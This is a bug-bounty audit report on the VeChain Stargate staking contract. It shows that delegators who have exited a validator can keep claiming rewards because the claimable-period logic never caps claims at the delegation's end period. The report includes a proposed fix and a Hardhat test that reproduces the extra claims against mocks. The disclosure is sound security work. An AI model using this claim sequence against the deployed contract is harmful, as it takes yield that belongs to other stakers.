# 60265 sc high the attacker can still claim rewards after exiting from validator

**Submitted on Nov 20th 2025 at 17:38:12 UTC by @aman for** [**Audit Comp | Vechain | Stargate Hayabusa**](https://immunefi.com/audit-competition/audit-comp-vechain-stargate-hayabusa)

* **Report ID:** #60265
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/Stargate.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

## Brief/Intro

When a delegator exits a validator, they are expected to stop earning rewards after the exit period. However, this core restriction does not function as intended, and users are still able to claim rewards even after their delegation exit period has passed.

## Vulnerability Details

In scenarios where the validator is still active and a delegator calls `requestDelegationExit`, the delegator is **not removed immediately** from the validator. Instead, the removal only takes effect **after the next period**, meaning the delegator remains active until then. This behavior can be observed in the following code snippet:

```solidity
/audit-comp-vechain-stargate-hayabusa/packages/contracts/contracts/Stargate.sol:523
523:     function requestDelegationExit(
524:         uint256 _tokenId
525:     ) external whenNotPaused onlyTokenOwner(_tokenId) nonReentrant {
526:         StargateStorage storage $ = _getStargateStorage();
527:         uint256 delegationId = $.delegationIdByTokenId[_tokenId];
...
547:         } else if (delegation.status == DelegationStatus.ACTIVE) {
548:             // If the delegation is active, we need to signal the exit to the protocol and wait for the end of the period
549: 
550:             // We do not allow the user to request an exit multiple times
551:             if (delegation.endPeriod != type(uint32).max) {
552:                 revert DelegationExitAlreadyRequested();
553:             }
554: 
555:             $.protocolStakerContract.signalDelegationExit(delegationId);
556:         } else {
557:             revert InvalidDelegationStatus(_tokenId, delegation.status);
558:         }
559: 
...
566: 
567:         // decrease the effective stake
568:         _updatePeriodEffectiveStake($, delegation.validator, _tokenId, completedPeriods + 2, false);
569: 
570:         emit DelegationExitRequested(_tokenId, delegation.validator, delegationId, exitBlock);
571:     }
```

The user’s stake stops being effective two periods after the current completed period. However, when claiming rewards, the protocol does not verify whether the delegation’s `endPeriod` has already passed. Because this check is missing, users are still allowed to claim rewards even after their delegation should no longer be eligible, leading to incorrect reward distribution.

```solidity
/audit-comp-vechain-stargate-hayabusa/packages/contracts/contracts/Stargate.sol:880
880:     function _claimableDelegationPeriods(
881:         StargateStorage storage $,
882:         uint256 _tokenId
883:     ) private view returns (uint32, uint32) {
884:         // get the delegation
885:         uint256 delegationId = $.delegationIdByTokenId[_tokenId];
886:         // if the token does not have a delegation, return 0
887:         if (delegationId == 0) {
888:             return (0, 0);
889:         }
890:         (address validator, , , ) = $.protocolStakerContract.getDelegation(delegationId);
891:         if (validator == address(0)) {
892:             return (0, 0);
893:         }
894: 
895:         (uint32 startPeriod, uint32 endPeriod) = $
896:             .protocolStakerContract
897:             .getDelegationPeriodDetails(delegationId);
898:         (, , , uint32 completedPeriods) = $.protocolStakerContract.getValidationPeriodDetails(
899:             validator
900:         );
901: 
902:         // current validator period is the next period because
903:         // the current period is the one that is not completed yet
904:         uint32 currentValidatorPeriod = completedPeriods + 1;
905: 
906:         // next claimable period is the last claimed period + 1
907:         uint32 nextClaimablePeriod = $.lastClaimedPeriod[_tokenId] + 1;
908:         // if the next claimable period is before the start period, set it to the start period
909:         if (nextClaimablePeriod < startPeriod) {
910:             nextClaimablePeriod = startPeriod;
911:         }
912: 
913:         // check first for delegations that ended
914:         // endPeriod is not max if the delegation is exited or requested to exit
915:         // if the endPeriod is before the current validator period, it means the delegation ended
916:         // because if its equal it means they requested to exit but the current period is not over yet
917:         if (
918:             endPeriod != type(uint32).max &&
919:             endPeriod < currentValidatorPeriod &&
920:             endPeriod > nextClaimablePeriod
921:         ) {
922:             return (nextClaimablePeriod, endPeriod);
923:         }
924: 
925:         // check that the start period is before the current validator period
926:         // and if it is, return the start period and the current validator period.
927:         // we use "less than" because if we use "less than or equal", even
928:         // if the delegation started, the current period rewards are not claimable
929:         if (nextClaimablePeriod < currentValidatorPeriod) {
930:             return (nextClaimablePeriod, completedPeriods);
931:         }
932: 
933:         // the rest are either pending, non existing or are active but have no claimable periods
934:         return (0, 0);
935:     }
```

In the above code snippet, we can see that there is no check to determine whether the `endPeriod` has already passed or whether the delegator has exited from the validator. As a result, an attacker or normal user can continue claiming rewards even though they no longer have an active delegation on this validator. The Docs clearly mention that :

> Once exited, the NFT:

> 1. Stops generating rewards
> 2. Can be unstaked or delegated again

## Impact Details

An attacker or user can continue claiming rewards even after their delegation is no longer active and has already exited, resulting in unauthorized reward extraction.

## References

[Section-Exited](https://docs.stargate.vechain.org/hayabusa/overview/delegation-lifecycle#delegation-states)

## Recommendation

One if the potential fix could be following :

```git
diff --git a/packages/contracts/contracts/Stargate.sol b/packages/contracts/contracts/Stargate.sol
index 50818d5..ed84133 100644
--- a/packages/contracts/contracts/Stargate.sol
+++ b/packages/contracts/contracts/Stargate.sol
@@ -920,6 +921,10 @@ contract Stargate is
         ) {
             return (nextClaimablePeriod, endPeriod);
         }
+        // in case endPeriod is in past we need to cap it at endPeriod of delegator delegation
+        if(endPeriod <= currentValidatorPeriod){
+            return (nextClaimablePeriod , endPeriod);
+        }
```

## Proof of Concept

## Proof of Concept

Add the Following test case to the file `test/unit/Stargate/Delegation.test.ts` and run with command `npx hardhat test`

```javascript
/audit-comp-vechain-stargate-hayabusa/packages/contracts/test/unit/Stargate/Delegation.test.ts:352
352:     
    it.only("Attacker can claim rewards even after Exiting the delegation from validator", async () => {
        const levelSpec = await stargateNFTMock.getLevel(LEVEL_ID);
        // 1. First user stake
        tx = await stargateContract.connect(user).stake(LEVEL_ID, {
            value: levelSpec.vetAmountRequiredToStake,
        });
        await tx.wait();
        const tokenId = await stargateNFTMock.getCurrentTokenId();
        console.log("\n🎉 Staked token with id:", tokenId);
        // 2. 2nd user stake
        await(await stargateContract.connect(otherUser).stake(LEVEL_ID, {
            value: levelSpec.vetAmountRequiredToStake,
        })).wait();
        const tokenId1 = await stargateNFTMock.getCurrentTokenId();
        console.log("\n🎉 Staked token with id:", tokenId1);


        // delegate the NFTs to the validator
        tx = await stargateContract.connect(user).delegate(tokenId, validator.address);
        await tx.wait();
        console.log("\n🎉 Correctly delegated the NFT to validator", validator.address);
        await(await stargateContract.connect(otherUser).delegate(tokenId1, validator.address)).wait();

        // check the delegation status
        const delegationStatus = await stargateContract.getDelegationStatus(tokenId);
        expect(delegationStatus).to.equal(DELEGATION_STATUS_PENDING);
        // advance 1 period to make Delegation ACTIVE
        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 1);
        await tx.wait();

        // Request Exit will be effective after 2 periods
        tx = await stargateContract.connect(user).requestDelegationExit(tokenId);
        await tx.wait();

        // advance 2 period
        // so the delegation is exited
        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 2);
        await tx.wait();
        console.log("\n Set validator completed periods to 2 so the delegation is exited");
        expect(await stargateContract.getDelegationStatus(tokenId)).to.equal(
            DELEGATION_STATUS_EXITED
        );
        console.log("1.1 ACTIVE Delegation" , await vthoTokenContract.balanceOf(user.address));
        console.log("2.1 ACTIVE Delegation" , await vthoTokenContract.balanceOf(otherUser.address));

        // this climed is correct for both users/tokens as the exited one has not cliamed rewards yet
        const firstUserClaim = await stargateContract.claimRewards(tokenId);
        console.log("1.2 ACTIVE Delegation ", await vthoTokenContract.balanceOf(user.address));
        
        const secondUserClaim = await stargateContract.claimRewards(tokenId1);
        console.log("2.2 ACTIVE Delegation" , await vthoTokenContract.balanceOf(otherUser.address));
        // We move the Period to 8 Now the Exited one shold not be able to claim rewards as intended
        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 8);
        const firstUserClaim1=  await stargateContract.claimRewards(tokenId1);
        const secondUserClaim1 = await stargateContract.claimRewards(tokenId);
        console.log("3 EXITED Delegation" , await vthoTokenContract.balanceOf(user.address));
        console.log("2.3 ACTIVE Delegation" , await vthoTokenContract.balanceOf(otherUser.address));

        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 10);
        // await stargateContract.claimRewards(tokenId);
        expect(await stargateContract.lockedRewards(tokenId)).to.equal(0); // As the delegation has EXITED so there would be no locked rewards
        const beforeUserLastClaim = await vthoTokenContract.balanceOf(user.address);

        await stargateContract.claimRewards(tokenId); // but the user of tokenId which delegation has EXITED can still claim rewards
        await stargateContract.claimRewards(tokenId1); 

        const finaluserBal = await vthoTokenContract.balanceOf(user.address);
        expect(finaluserBal).to.be.greaterThan(beforeUserLastClaim)
        // effective stake at period 2 must be grator than period 10 because at 2 both stake were active 
        expect(await stargateContract.getDelegatorsEffectiveStake(validator.address , 2)).to.be.greaterThan(await stargateContract.getDelegatorsEffectiveStake(validator.address , 10))
        // As in this Test case Both the tokenOwners have claimed All the Rewards so their balance must be same due to the bug
        expect(await vthoTokenContract.balanceOf(user.address)).to.equal(await vthoTokenContract.balanceOf(otherUser.address));
    });
```
